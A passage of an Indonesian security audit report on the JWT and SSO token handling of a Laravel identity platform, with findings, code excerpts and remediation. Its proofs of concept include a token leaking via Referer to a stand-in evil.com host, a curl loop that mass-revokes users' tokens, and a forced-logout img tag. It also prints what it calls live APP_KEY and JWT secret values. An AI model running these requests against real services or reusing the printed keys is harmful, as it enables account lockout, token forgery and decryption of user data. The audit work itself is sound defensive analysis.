# 🔐 Laporan Audit Keamanan: Implementasi JWT — NexaID IAM

> **Proyek:** NexaID IAM (Identity & Access Management)
> **Tanggal Audit:** 17-06-2026
> **Skala Tingkat Keparahan:** 🔴 Kritis | 🟠 Tinggi | 🟡 Sedang | ⚪ Informasional
> **Versi yang Diaudit:** `firebase/jwt` (via Composer), implementasi HMAC kustom, Laravel 12.x, Passport 12.x

---

## Daftar Isi

1. [Ringkasan Eksekutif](#1-ringkasan-eksekutif)
2. [Arsitektur & Cakupan Token](#2-arsitektur--cakupan-token)
3. [Katalog Temuan](#3-katalog-temuan)
   - [F-001: Token Dikirim melalui String Query URL](#f-001-token-dikirim-melalui-string-query-url)
   - [F-002: Endpoint Pencabutan Token Tanpa Autentikasi](#f-002-endpoint-pencabutan-token-tanpa-autentikasi)
   - [F-003: Refresh Token Melewati Pengecekan Pencabutan](#f-003-refresh-token-melewati-pengecekan-pencabutan)
   - [F-004: Kaskade APP_KEY Bersama](#f-004-kaskade-app_key-bersama)
   - [F-005: Rantai Logout Tanpa Autentikasi](#f-005-rantai-logout-tanpa-autentikasi)
   - [F-006: Klaim jti Hilang — Tidak Ada Pencabutan Per-Token](#f-006-klaim-jti-hilang--tidak-ada-pencabutan-per-token)
   - [F-007: Klaim aud Hilang — Penggunaan Ulang Token Lintas Klien](#f-007-klaim-aud-hilang--penggunaan-ulang-token-lintas-klien)
   - [F-008: Terdapat Beberapa Implementasi JWT yang Bertentangan](#f-008-terdapat-beberapa-implementasi-jwt-yang-bertentangan)
   - [F-009: APP_DEBUG Aktif di Produksi](#f-009-app_debug-aktif-di-produksi)
   - [F-010: Konfigurasi Sesi Tidak Aman](#f-010-konfigurasi-sesi-tidak-aman)
   - [F-011: Pencocokan Pola Origin CORS Longgar](#f-011-pencocokan-pola-origin-cors-longgar)
   - [F-012: Klaim nbf Hilang / Jendela Pergeseran Waktu (Clock Skew)](#f-012-klaim-nbf-hilang--jendela-pergeseran-waktu-clock-skew)
   - [F-013: Tidak Ada Mekanisme Rotasi Kunci Otomatis](#f-013-tidak-ada-mekanisme-rotasi-kunci-otomatis)
   - [F-014: Ambiguitas Fallback Rahasia HMAC](#f-014-ambiguitas-fallback-rahasia-hmac)
   - [F-015: Endpoint Introspeksi Menjadi Oracle Error](#f-015-endpoint-introspeksi-menjadi-oracle-error)
   - [F-016: Penugasan Middleware Duplikat](#f-016-penugasan-middleware-duplikat)
   - [F-017: Sinkronisasi Peran Mode-Tarik (Pull-Mode) Membuat Peran Secara Default](#f-017-sinkronisasi-peran-mode-tarik-pull-mode-membuat-peran-secara-default)
   - [F-018: Kunci Penandatanganan JWT Global Tunggal — Tidak Ada Isolasi Per-Aplikasi](#f-018-kunci-penandatanganan-jwt-global-tunggal--tidak-ada-isolasi-per-aplikasi)
4. [Skenario Serangan](#4-skenario-serangan)
5. [Peta Jalan Perbaikan](#5-peta-jalan-perbaikan)
6. [Diagram Arsitektur](#6-diagram-arsitektur)

---

## 1. Ringkasan Eksekutif

Audit ini mengidentifikasi **5 temuan kritis, 5 tinggi, 5 sedang, dan 3 informasional** di seluruh subsistem autentikasi dan SSO berbasis JWT. Platform IAM mengimplementasikan **tiga jalur penerbitan token yang berbeda** dengan struktur payload, kunci penandatanganan, dan logika verifikasi yang berbeda — menciptakan permukaan serangan yang kompleks di mana kerentanan pada satu jalur dapat membahayakan seluruh sistem.

### Gambaran Risiko

| Kategori | 🔴 Kritis | 🟠 Tinggi | 🟡 Sedang | ⚪ Info |
|----------|:-----------:|:--------:|:----------:|:-------:|
| Penanganan Token | 1 | 0 | 0 | 0 |
| Keamanan Endpoint | 1 | 0 | 0 | 0 |
| Logika Autentikasi | 1 | 0 | 0 | 0 |
| Manajemen Kunci | 1 | 1 | 1 | 0 |
| Kepatuhan Protokol | 0 | 2 | 2 | 1 |
| Lingkungan & Konfigurasi | 1 | 0 | 1 | 0 |
| Arsitektur | 0 | 2 | 1 | 2 |
| **Total** | **5** | **5** | **5** | **3** |

### Metrik Kunci

| Dimensi | Skor | Catatan |
|-----------|:-----:|-------|
| **Penandatanganan** | 2/10 | Kunci global tunggal dibagikan di SEMUA aplikasi klien; tidak ada isolasi per-aplikasi |
| **Pencabutan** | 3/10 | Tidak ada pencabutan per-token; alur refresh melewati pengecekan |
| **Manajemen Kunci** | 2/10 | Kaskade APP_KEY; tidak ada rotasi |
| **Kepatuhan Protokol** | 4/10 | Token dalam URL; hilangnya aud/jti/nbf |
| **Keamanan Transport** | 5/10 | Tidak ada penegakan HTTPS dalam kode; sesi tidak dienkripsi |
| **Audit & Logging** | 8/10 | SsoLogger komprehensif dan terstruktur |
| **Keseluruhan** | **4.3/10** | **Dibutuhkan perbaikan segera** |

---

## 2. Arsitektur & Cakupan Token

### 2.1 Tiga Sistem Token Paralel

```
┌─────────────────────────────────────────────────────────────────────┐
│                    PETA ARSITEKTUR TOKEN                            │
├─────────────────────────┬─────────────────┬─────────────────────────┤
│      Sistem #1          │   Sistem #2     │    Sistem #3            │
│    TokenBuilder         │ JWTTokenService │   TokenService          │
│  (app/Services/)        │ (Domain/Iam/)   │   (Services/Sso/)       │
├─────────────────────────┼─────────────────┼─────────────────────────┤
│ Pustaka: firebase/jwt   │ firebase/jwt    │ HMAC Kustom             │
│ Algoritma: HS256        │ HS256           │ HS256 (hmac mentah)     │
│ Rahasia: iam.signing_key│ iam.signing_key │ sso.secret              │
│                         │                 │                         │
│ Payload termasuk:       │ Payload termsk: │ Payload termasuk:       │
│  • sub, nip, email      │  • sub, name    │  • sub, nip, email      │
│  • apps, roles_by_app   │  • email        │  • app, roles           │
│  • unit, employee_id    │  • app_key      │  • iat, exp             │
│  • iat, exp, type       │  • roles        │                         │
│  • extra (app, dll.)    │  • iat, exp     │                         │
│                         │  • session_id   │                         │
│                         │  • type         │                         │
├─────────────────────────┼─────────────────┼─────────────────────────┤
│ Digunakan oleh:         │ Digunakan oleh: │ Digunakan oleh:         │
│ • SSO redirect          │ • Alur OAuth2   │ • Jalur SsoLogger       │
│ • SSO verify            │ • Access token  │   (penerbitan/verif)    │
│ • Token refresh         │ • Refresh token │                         │
│ • Penerbitan Token      │ • Backchannel   │                         │
│                         │                 │                         │
└─────────────────────────┴─────────────────┴─────────────────────────┘
```

### 2.2 Matriks Tipe Token

| Tipe Token | Penerbit | TTL | Dapat Dicabut? | Berisi |
|------------|--------|:---:|:----------:|----------|
| Access Token (Sistem #1) | `TokenBuilder` | 3600s (default) | ✅ Sebagian | sub, nip, email, apps, roles_by_app |
| Refresh Token (Sistem #1) | `TokenBuilder` | 30 hari | ✅ Sebagian | sub, nip, email, apps, roles_by_app |
| Access Token (Sistem #2) | `JWTTokenService` | Per-aplikasi (default 3600s) | ✅ via Cache | sub, name, email, app_key, roles |
| Refresh Token (Sistem #2) | `JWTTokenService` | 30 hari | ✅ via Cache | sub, app_key |
| Backchannel Token | `JWTTokenService` | 300s | ❌ Tidak | iss, app_key |
| SSO Token (Sistem #3) | `TokenService` | 300s | ❌ Tidak | sub, nip, email, app, roles |

### 2.3 Kaskade Resolusi Rahasia

```yaml
# TokenBuilder / JWTTokenService
signing_key:
  sources:
    - env("IAM_SIGNING_KEY")
    - env("IAM_JWT_SECRET")        # ← fallback 1
    - env("APP_KEY")               # ← fallback 2 — DIBAGIKAN BERSAMA ENKRIPSI

# TokenService (HMAC Kustom)
sso.secret:
  sources:
    - env("SSO_SECRET")
    - env("APP_KEY")               # ← fallback — DIBAGIKAN BERSAMA ENKRIPSI

# config/iam.php
sso_secret:
  sources:
    - env("IAM_SSO_SECRET")
    - env("SSO_SECRET")
    - env("IAM_JWT_SECRET")        # ← dapat berbeda dari signing_key!
```

---

## 3. Katalog Temuan

### F-001: Token Dikirim melalui String Query URL

| Atribut | Nilai |
|-----------|-------|
| **Keparahan** | 🔴 **Kritis** |
| **Komponen** | `SsoRedirectController::__invoke` |
| **File** | `app/Http/Controllers/Sso/SsoRedirectController.php:101-103` |
| **CWE** | CWE-598: Informasi Terekspos Melalui String Query pada Permintaan GET |
| **CVSS 3.1** | 8.7 (AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N) |

#### Deskripsi

Alur redirect SSO mengirimkan token JWT yang telah ditandatangani sebagai parameter query URL dalam redirect browser:

```php
// SsoRedirectController.php:101-103
$redirectUrl = $application->callback_url . $separator . http_build_query([
    'token' => $token,    // ← JWT dalam string query
]);
return redirect()->away($redirectUrl);
```

#### Dampak

1. **Pengeksposan Sisi Server:**
   - Semua log akses reverse proxy merekam URL lengkap termasuk JWT
   - Log akses server web (Nginx, Apache) menangkap token
   - Entri log aplikasi (`Log::info` di baris 95-99) mencatat `token_preview` tetapi dapat secara tidak sengaja mencatat token lengkap
   - Log CDN/load balancer mengekspos token

2. **Pengeksposan Sisi Klien:**
   - Browser menyimpan URL dalam **riwayat** (bahkan dalam penyamaran/incognito di beberapa browser)
   - URL lengkap dengan token muncul di **address bar**
   - **Header Referer** yang dikirim ke resource pihak ketiga berikutnya menyertakan token
   - Ekstensi browser dengan akses URL dapat menangkap token

3. **Serangan Teoretis:**
   ```
   Penyerang dengan akses ke:
     → log server web (orang dalam, RCE gaya log4j, S3 salah konfigurasi)
     → riwayat browser (akses fisik, malware)
     → lalu lintas jaringan (segmen tidak terenkripsi, CA yang dikompromikan)
   
   Dapat mengekstrak token dan memutarnya kembali untuk mendapatkan akses terautentikasi.
   ```

#### Bukti Konsep (Proof of Concept)

```bash
# Token muncul dalam teks biasa di log akses
$ tail -f /var/log/nginx/access.log
192.168.1.100 - - [17/Jun/2026:14:30:00 +0700] "GET /sso/callback?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9... HTTP/1.1" 302 -

# Setiap gambar/widget pihak ketiga pada halaman callback menerima token di Referer
GET https://analytics.evil.com/collect
Referer: https://client-app.com/sso/callback?token=eyJ0eXAiOiJKV1Qi...
```

#### Referensi OWASP / RFC

- **RFC 6750 §2.3** secara eksplisit menyarankan untuk tidak mengirimkan token bearer dalam parameter query URI
- **RFC 6819 §5.1.4** memperingatkan tentang kebocoran token melalui log dan header Referer
- **Praktik Keamanan Terbaik OAuth 2.0 §4.3.2** merekomendasikan untuk tidak pernah mengirimkan token dalam string query

#### Rekomendasi

**Segera (1 hari):**
- Arahkan klien ke URL **tanpa** token, dengan meneruskannya melalui POST body atau melalui session/cookie
- ATAU, jika callback harus menggunakan GET, arahkan ke URL callback tanpa token dan biarkan klien mengambil token dari endpoint yang terautentikasi:

```php
// Pendekatan yang direkomendasikan:
$sessionId = session()->getId();
Cache::put("sso_token:{$sessionId}", $token, 300);

$redirectUrl = $application->callback_url . '?' . http_build_query([
    'session' => $sessionId,    // referensi sesi, bukan token itu sendiri
    'state' => $request->state,
]);
return redirect()->away($redirectUrl);
```

**Jangka Pendek (1 minggu):**
- Terapkan **Alur Kode Otorisasi OAuth 2.0** (Authorization Code Flow) dengan benar:
  - Kode pertukaran adalah referensi opak sekali pakai yang berumur pendek (60s) dan disimpan di sisi server
  - Token sebenarnya diterbitkan melalui pertukaran POST server-ke-server

---

### F-002: Endpoint Pencabutan Token Tanpa Autentikasi

| Atribut | Nilai |
|-----------|-------|
| **Keparahan** | 🔴 **Kritis** |
| **Komponen** | `TokenExpiredNotificationController` |
| **File** | `app/Http/Controllers/Api/TokenExpiredNotificationController.php` |
| **CWE** | CWE-306: Hilangnya Autentikasi untuk Fungsi Kritis |
| **CVSS 3.1** | 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H) |

#### Deskripsi

Endpoint `/api/iam/notify-token-expired` menerima permintaan POST **tanpa autentikasi apa pun** dan memungkinkan pemanggil eksternal untuk:

1. Menetapkan `user_logout_at:{$userId}` di cache, yang **mencabut semua token** untuk pengguna tersebut
2. Melakukan cache pada notifikasi kedaluwarsa sembarang

```php
// routes/sso.php:38-41
Route::post('/iam/notify-token-expired', ...)
    ->middleware(SsoLoggingMiddleware::class)  // ← hanya logging, tidak ada auth!
    // Tidak ada iam.verify, tidak ada sso.jwt, tidak ada validate.api.key!
```

Endpoint tersebut menerima parameter yang dapat dikontrol oleh pengguna tanpa verifikasi asal:

```php
// TokenExpiredNotificationController.php:29-33
$data = $request->validate([
    'user_id' => 'required|integer',    // ID pengguna apa pun
    'app_key' => 'required|string',     // Kunci aplikasi apa pun
    'expired_at' => 'required|date_format:Y-m-d\TH:i:s\Z|nullable',
]);

// Tidak ada pengecekan bahwa pemanggil memiliki otorisasi untuk mencabut token pengguna/aplikasi ini
```

#### Dampak

1. **Penolakan Layanan / Denial of Service (Penguncian Akun):**
   Seorang penyerang dapat secara sistematis mencabut token untuk **pengguna mana pun** di dalam sistem:

   ```bash
   # Penguncian akun massal
   for uid in $(seq 1 1000); do
     curl -X POST https://iam.example.com/api/iam/notify-token-expired \
       -H "Content-Type: application/json" \
       -d "{\"user_id\": $uid, \"app_key\": \"siimut\", \"expired_at\": \"2026-06-17T14:30:00Z\"}"
   done
   ```

2. **Logika Pencabutan (TokenBuilder::verify):**
   ```php
   // TokenBuilder.php:154-157
   $logoutAt = Cache::get("user_logout_at:{$claims->userId}");
   if ($logoutAt !== null && $claims->issuedAt <= $logoutAt) {
       throw new \Exception('Token has been revoked due to user logout.');
   }
   ```
   Karena kunci cache **tidak memiliki kedaluwarsa**, satu permintaan akan secara permanen mencabut semua token yang ada untuk pengguna tersebut. Pengguna harus melakukan autentikasi ulang.

#### Rekomendasi

**Segera (1 hari):**
Tambahkan persyaratan autentikasi:

```php
// Opsi A: Mewajibkan autentikasi JWT
Route::post('/iam/notify-token-expired', ...)
    ->middleware(['sso.jwt', SsoLoggingMiddleware::class]);

// Opsi B: Mewajibkan validasi tanda tangan HMAC
// Aplikasi klien menghitung: HMAC-SHA256(body, shared_secret)
$expectedSig = hash_hmac('sha256', $request->getContent(), config('iam.sso_secret'));
$providedSig = $request->header('X-IAM-Signature');
if (!hash_equals($expectedSig, $providedSig)) {
    abort(401, 'Invalid signature');
}

// Opsi C: Mewajibkan API key (jika model IntegrationKey sesuai)
Route::post('/iam/notify-token-expired', ...)
    ->middleware(['validate.api.key', SsoLoggingMiddleware::class]);
```

**Jangka Pendek (1 minggu):**
- Ganti pengaturan cache tanpa autentikasi dengan pencabutan **berbasis peristiwa (event-driven)** yang tepat melalui antrean (queue)
- Tambahkan verifikasi tanda tangan HMAC yang cocok dengan apa yang digunakan oleh `ApplicationRoleSyncService` untuk sinkronisasi keluar
- Kurangi TTL cache `user_logout_at` dari tidak terbatas menjadi jendela yang wajar (misalnya, 2× dari TTL maksimum token)

---

### F-003: Refresh Token Melewati Pengecekan Pencabutan

| Atribut | Nilai |
|-----------|-------|
| **Keparahan** | 🔴 **Kritis** |
| **Komponen** | `SsoTokenController::refresh`, `SsoTokenController::handleRefreshTokenGrant` |
| **File** | `app/Domain/Iam/Http/Controllers/SsoTokenController.php:211-238`, `:294-326` |
| **CWE** | CWE-862: Kehilangan Otorisasi |
| **CVSS 3.1** | 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |

#### Deskripsi

Endpoint refresh token menggunakan `TokenBuilder::decode()` alih-alih `TokenBuilder::verify()`. Perbedaan kritisnya:

| Metode | Pengecekan Tanda Tangan | Pengecekan Kedaluwarsa | Pengecekan Pencabutan Logout | Pengecekan Sesi Aktif |
|--------|:--------------:|:------------:|:-----------------------:|:--------------------:|
| `decode()` | ✅ | ❌ | ❌ | ❌ |
| `verify()` | ✅ | ✅ | ✅ | ✅ |

```php
// SsoTokenController::refresh() — Token Sistem #1
public function refresh(Request $request): JsonResponse
{
    $claims = $this->tokenBuilder->decode($request->token);  // ← Menggunakan decode(), BUKAN verify()
    if ($claims->type !== 'refresh') { ... }

    $newToken = $this->tokenBuilder->refresh($request->token);
    // TokenBuilder::refresh() secara internal memanggil verify() — TETAPI menangkap dan melempar kembali (re-throw)!
```

```php
// SsoTokenController::handleRefreshTokenGrant() — Token Sistem #2
$claims = $this->tokenBuilder->decode($request->refresh_token);  // ← Juga decode()!
if ($claims->type !== 'refresh') { ... }

$newToken = $this->tokenBuilder->refresh($request->refresh_token);
```

Lebih lanjut, `TokenBuilder::refresh()` itu sendiri memanggil `verify()` secara internal tetapi menangkap pengecualian dan melemparnya kembali dengan pesan generik:

```php
// TokenBuilder.php:205-212
public function refresh(string $token): string
{
    try {
        $oldClaims = $this->verify($token);    // ← verify MEMERIKSA pencabutan
    } catch (\Exception $verifyErr) {
        throw new \Exception('Token refresh denied: ' . $verifyErr->getMessage());
    }
    // ... pencarian pengguna dan rekonstruksi token
```

Namun, **controller tidak pernah mencapai `refresh()`** jika pengguna memanggil endpoint refresh langsung, karena `decode()` di baris 218 **tidak akan gagal untuk token yang dicabut** — itu hanya memvalidasi tanda tangan.

#### Dampak

```
Garis waktu:
  t=0:  Pengguna memperoleh Refresh Token A
  t=5m: Pengguna logout → user_logout_at = t=5m
  t=6m: Penyerang memiliki Refresh Token A (dari log, malware, dll.)
  t=6m: Penyerang memanggil POST /api/sso/token/refresh
         → Controller memanggil decode(A)      → LULUS (tanda tangan valid)
         → Controller memanggil refresh(A)     → secara internal memanggil verify()
         → verify() memeriksa user_logout_at  → issuedAt(0) <= logoutAt(5m) → MELEMPAR ERROR
         → Controller menangkap → mengembalikan "Token refresh denied" → GAGAL ❌

  TETAPI: Penyerang kemudian memanggil:
  t=7m: POST /api/sso/token (Endpoint OAuth2)
         → SsoFlowService::handleRefreshTokenGrant()
         → Menggunakan JWTTokenService::verifyToken() — yang TIDAK memeriksa user_logout_at!
         → Memeriksa isRefreshTokenRevoked()     — memeriksa Cache::get("refresh_token:{$sub}:{$app_key}")
         → Jika token masih dicache → LULUS
```

**Hasil:** Alur izin (grant flow) OAuth2 (`POST /oauth/token` dengan `grant_type=refresh_token`) menggunakan `JWTTokenService` yang sama sekali TIDAK MEMILIKI pengecekan `user_logout_at`, sepenuhnya melewati pencabutan.

#### Rekomendasi

**Segera (1 hari):**
- Ganti `decode()` dengan `verify()` di kedua endpoint refresh
- Tambahkan pengecekan `user_logout_at` ke `JWTTokenService::verifyToken()`:

```php
// SsoTokenController.php:218
// Sebelum: $claims = $this->tokenBuilder->decode($request->token);
// Sesudah: $claims = $this->tokenBuilder->verify($request->token);
```

```php
// JWTTokenService.php:137-150 — Tambahkan pengecekan user_logout_at
public function verifyToken(string $token): object
{
    try {
        $decoded = JWT::decode($token, new Key($this->secretKey, $this->algorithm));

        // Tambahkan pengecekan logout
        $logoutAt = Cache::get("user_logout_at:{$decoded->sub}");
        if ($logoutAt !== null && $decoded->iat <= $logoutAt) {
            throw new \Exception('Token has been revoked due to user logout.');
        }

        if (isset($decoded->session_id) && !$this->isSessionActive((string) $decoded->session_id)) {
            throw new \Exception('Session is inactive or has been revoked.');
        }

        return $decoded;
    } catch (\Exception $e) {
        throw new \Exception('Invalid or expired token: ' . $e->getMessage());
    }
}
```

**Jangka Pendek (1 minggu):**
- Terapkan **rotasi refresh token**: terbitkan refresh token baru pada setiap refresh, cabut yang lama
- Konsolidasikan semua logika refresh ke dalam satu jalur kode

---

### F-004: Kaskade APP_KEY Bersama

| Atribut | Nilai |
|-----------|-------|
| **Keparahan** | 🟠 **Tinggi** |
| **Komponen** | `config/sso.php`, `config/iam.php`, `TokenBuilder`, `JWTTokenService`, `TokenService` |
| **CWE** | CWE-320: Kesalahan Manajemen Kunci / CWE-798: Penggunaan Kredensial Hard-coded |
| **CVSS 3.1** | 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) — sebagian; dampak penuh membutuhkan pembongkaran kunci |

#### Deskripsi

`APP_KEY` adalah **kunci enkripsi master** untuk aplikasi Laravel. Kunci ini mengenkripsi:
- Data sesi (saat `SESSION_ENCRYPT=true`)
- Nilai cookie
- Atribut Eloquent yang dienkripsi
- Token `remember_me`
- Token reset password (bila disimpan dalam keadaan terenkripsi)

Proyek ini menurunkan (cascade) `APP_KEY` ke dalam **empat** rantai rahasia (secret) yang berbeda:

```
config/sso.php
  secret = env("SSO_SECRET", env("APP_KEY"))              ← fallback LANGSUNG ke APP_KEY

config/iam.php
  jwt_secret = env("IAM_JWT_SECRET", env("APP_KEY"))      ← fallback LANGSUNG
  signing_key = env("IAM_SIGNING_KEY", env("IAM_JWT_SECRET")) ← cascade melalui jwt_secret
  sso_secret = env("IAM_SSO_SECRET", env("SSO_SECRET", env("IAM_JWT_SECRET"))) ← cascade 3 tingkat
```

Jika `IAM_JWT_SECRET` dikompromikan (file `.env` sebenarnya mengaturnya secara eksplisit), itu TIDAK selalu membocorkan `APP_KEY`. Tetapi **mekanisme** fallback ini berarti:
- Setiap pengembang yang melihat `config/iam.php` akan tahu `APP_KEY` pada akhirnya adalah nilai fallback
- Jika seseorang tanpa sengaja menghapus `IAM_JWT_SECRET` dari `.env`, `APP_KEY` akan menjadi kunci penandatanganan JWT
- `config/sso.php` memiliki fallback **langsung** `env('SSO_SECRET', env('APP_KEY'))`, yang berarti jika `SSO_SECRET` tidak diatur secara eksplisit, `APP_KEY` akan digunakan sebagai rahasia HMAC

#### Konfigurasi Saat Ini Secara Aktual

File `.env` aktif mengatur:
```env
IAM_JWT_SECRET=base64:G8w0qytVP8V+Mml5pYqm90R9m7AdfltGk1GCXMGq2qw=   # Diatur secara eksplisit
```

Namun **tidak ada** variabel `SSO_SECRET` atau `IAM_SSO_SECRET` di mana pun dalam `.env`. Ini berarti:
```
sso.secret → env("SSO_SECRET") → tidak terdefinisi (undefined)
           → env("APP_KEY")    → base64:dt4sYZlqr9RYQWIGMmLVBmY0rEiit7hkwfXcdaaGnio=
```

**Rahasia HMAC SSO saat ini adalah `APP_KEY`** — kunci enkripsi master Laravel.

#### Dampak

Jika rahasia SSO bocor (misalnya, melalui output error dalam mode debug, paparan file log, atau dependensi yang dikompromikan), penyerang tidak hanya memalsukan token — mereka juga memiliki **kunci enkripsi Laravel**, yang memungkinkan mereka untuk:
1. Mendekripsi cookie sesi apa pun
2. Memalsukan token `remember_me`
3. Mendekripsi kolom database yang dienkripsi
4. Memalsukan URL yang ditandatangani
5. Mendekripsi data apa pun yang dienkripsi dengan `Crypt::encrypt()`

#### Rekomendasi

**Segera (1 hari):**
- Verifikasi bahwa `.env` memiliki nilai yang eksplisit dan **berbeda** untuk:
  ```env
  IAM_JWT_SECRET=base64:<unique-64-bytes>     # TIDAK BOLEH sama dengan APP_KEY
  SSO_SECRET=base64:<unique-64-bytes>          # Harus berbeda
  IAM_SSO_SECRET=base64:<unique-64-bytes>      # Boleh sama dengan SSO_SECRET
  IAM_SIGNING_KEY=base64:<unique-64-bytes>     # Boleh sama dengan IAM_JWT_SECRET
  ```

**Jangka Pendek (1 minggu):**
- Hapus nilai default fallback yang turun ke `APP_KEY`. Setiap konfigurasi rahasia harus memiliki variabel env khusus:
  ```php
  // config/iam.php — tidak ada fallback ke APP_KEY
  'signing_key' => env('IAM_SIGNING_KEY'),
  'jwt_secret' => env('IAM_JWT_SECRET'),
  
  // config/sso.php — tidak ada fallback ke APP_KEY
  'secret' => env('SSO_SECRET'),
  ```
- Tambahkan validasi saat boot di `AppServiceProvider`:
  ```php
  $this->app->booted(function () {
      $signing = config('iam.signing_key');
      $appKey = config('app.key');
      
      if ($signing === $appKey || str_ends_with($signing, $appKey)) {
          Log::critical('Kunci penandatanganan IAM TIDAK BOLEH sama dengan APP_KEY');
          // Atau lempar error di lingkungan non-produksi
      }
  });
  ```

---

### F-005: Rantai Logout Tanpa Autentikasi

| Atribut | Nilai |
|-----------|-------|
| **Keparahan** | 🟠 **Tinggi** |
| **Komponen** | `SsoLogoutChainController` |
| **File** | `app/Http/Controllers/Sso/SsoLogoutChainController.php` |
| **CWE** | CWE-306: Hilangnya Autentikasi untuk Fungsi Kritis |
| **CVSS 3.1** | 6.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H) |

#### Deskripsi

Endpoint `/sso/logout/chain` **dapat diakses publik** tanpa middleware autentikasi:

```php
// routes/sso.php:27-29
Route::get('/sso/logout/chain', \App\Http\Controllers\Sso\SsoLogoutChainController::class)
    ->name('sso.logout.chain');   // ← TIDAK ADA middleware auth
```

Controller melakukan iterasi atas semua aplikasi klien yang aktif dan mengeluarkan redirect browser ke endpoint `/iam/logout` dari masing-masing klien:

```php
// SsoLogoutChainController.php:31-43
$apps = Application::enabled()->get()
    ->filter(fn(Application $a) => !empty($a->logout_uri))
    ->values();

$app = $apps[$index];
$logoutUri = $app->logout_uri;
$target = $logoutUri . '?...' . 'post_logout_redirect=' . urlencode($next) . '&request_id=' . urlencode($requestId);

return redirect()->away($target);
```

Meskipun endpoint logout di aplikasi klien seharusnya bersifat idempoten, ini tetap memungkinkan hal-hal berikut:

#### Dampak

1. **Logout paksa untuk semua pengguna:** Penyerang dapat menyematkan tautan atau skrip yang mengarahkan pengguna melalui rantai tersebut, membuat mereka ter-logout dari semua aplikasi klien:
   ```html
   <!-- Email Phishing / posting forum -->
   <img src="https://iam.example.com/sso/logout/chain" width="1" height="1">
   ```

2. **Perantaian redirect yang dekat dengan SSRF:** Controller mengeluarkan redirect ke URL logout aplikasi klien. Meskipun `redirect()->away()` tidak secara langsung membuat permintaan sisi server, itu bisa digunakan dalam rantai open-redirect untuk melewati pemindai URL yang mengikuti redirect.

3. **Polusi log:** Setiap eksekusi membuat entri log di seluruh aplikasi yang diaktifkan, membuat analisis log keamanan menjadi bising (noisy).

#### Rekomendasi

**Segera (1 hari):**
- Tambahkan persyaratan autentikasi:
  ```php
  // routes/sso.php
  Route::get('/sso/logout/chain', SsoLogoutChainController::class)
      ->middleware('auth')           // Wajibkan pengguna yang sudah login
      ->name('sso.logout.chain');
  ```

**Jangka Pendek (1 minggu):**
- Terapkan mekanisme **propagasi logout sisi server** alih-alih redirect browser
- Tambahkan proteksi CSRF dan validasi parameter nonce/state untuk mencegah penempaan rantai lintas permintaan (cross-request forging)
- Pertimbangkan pembatasan laju (rate-limiting) untuk endpoint rantai logout

---

### F-006: Klaim jti Hilang — Tidak Ada Pencabutan Per-Token

| Atribut | Nilai |
|-----------|-------|
| **Keparahan** | 🟠 **Tinggi** |
| **Komponen** | `TokenClaims`, `JWTTokenService`, `TokenService` |
| **File** | Berbagai file |
| **CWE** | CWE-290: Pelewatan Autentikasi melalui Spoofing |
| **CVSS 3.1** | 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |

#### Deskripsi

Tidak ada satu pun dari ketiga implementasi JWT yang menyertakan klaim `jti` (JWT ID). Menurut RFC 7519 §4.1.7, klaim `jti` menyediakan pengidentifikasi unik untuk token yang dapat digunakan untuk mencegah pemutaran ulang token (token replay).

Tanpa `jti`:

| Kemampuan | Dengan jti | Tanpa jti |
|------------|:--------:|:-----------:|
| Mencabut token individu | ✅ Tambahkan ke blacklist | ❌ Harus mencabut SEMUA token pengguna |
| Mendeteksi pemutaran ulang token | ✅ Cek apakah jti sudah digunakan | ❌ Tidak dapat dideteksi |
| Mengaudit siklus hidup token individu | ✅ Pelacakan siklus hidup penuh | ❌ Tidak dapat melacak token spesifik |
| Rotasi refresh token | ✅ Cabut jti lama | ❌ Tidak dapat mencabut token lama secara spesifik |

#### Mekanisme Pencabutan Saat Ini

Satu-satunya mekanisme pencabutan adalah:
```php
Cache::put("user_logout_at:{$user->id}", time());
```

Ini adalah metode pukul rata (sledgehammer): ini membatalkan **setiap** token yang pernah diterima pengguna, bahkan token yang diterbitkan untuk aplikasi yang berbeda atau dari sesi yang berbeda.

#### Dampak

1. **Tidak dapat mencabut satu token yang disusupi** tanpa mencabut semua token untuk pengguna tersebut
2. **Tidak dapat mendeteksi serangan pemutaran ulang (replay) token** — JWT yang sama yang diputar kembali dari IP berbeda tidak akan terdeteksi
3. **Tidak dapat mengimplementasikan token pinning** — mis. "hanya terima token spesifik ini untuk operasi spesifik ini"
4. **Tidak dapat menyediakan logout granular** — "logout dari perangkat/sesi spesifik ini" tanpa mempengaruhi yang lain

#### Rekomendasi

**Jangka Pendek (1 minggu):**

Tambahkan `jti` ke payload token dan implementasikan daftar hitam (blacklist) token:

```php
// Pada TokenBuilder::buildClaimsForUser()
$payload['jti'] = bin2hex(random_bytes(16));

// Pada verify()
if ($this->isTokenBlacklisted($payload['jti'] ?? '')) {
    throw new \Exception('Token has been revoked.');
}

// Pengecekan daftar hitam (Blacklist)
private function isTokenBlacklisted(string $jti): bool
{
    return Cache::has("token_blacklist:{$jti}");
}

// Metode pencabutan (Revoke)
public function revokeToken(string $jti): void
{
    Cache::put("token_blacklist:{$jti}", true, 86400 * 30); // Max TTL token
}
```

**Jangka Panjang (1 bulan):**
- Terapkan tabel daftar hitam token yang tepat di database dengan pembersihan kedaluwarsa otomatis
- Simpan `jti` di log akses/audit untuk pelacakan
- Tambahkan `jti` ke access token maupun refresh token

---

### F-007: Klaim aud Hilang — Penggunaan Ulang Token Lintas Klien

| Atribut | Nilai |
|-----------|-------|
| **Keparahan** | 🟠 **Tinggi** |
| **Komponen** | Semua penerbit token |
| **CWE** | CWE-285: Otorisasi yang Tidak Tepat |
| **CVSS 3.1** | 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) |

#### Deskripsi

Token JWT tidak menyertakan klaim `aud` (audience) untuk membatasi aplikasi mana yang dituju oleh token tersebut. Meskipun payload menyertakan kolom informasi `app` atau `app_key`, tidak ada endpoint yang memastikan bahwa audiens yang dituju oleh token tersebut cocok dengan aplikasi yang membuat permintaan.

#### Status Saat Ini

```php
// Token yang diterbitkan untuk Aplikasi A
$payload = [
    'sub' => 42,
    'app' => 'app-a',          // ← Hanya informasional
    'roles_by_app' => [...]    // ← Berisi peran untuk SEMUA aplikasi
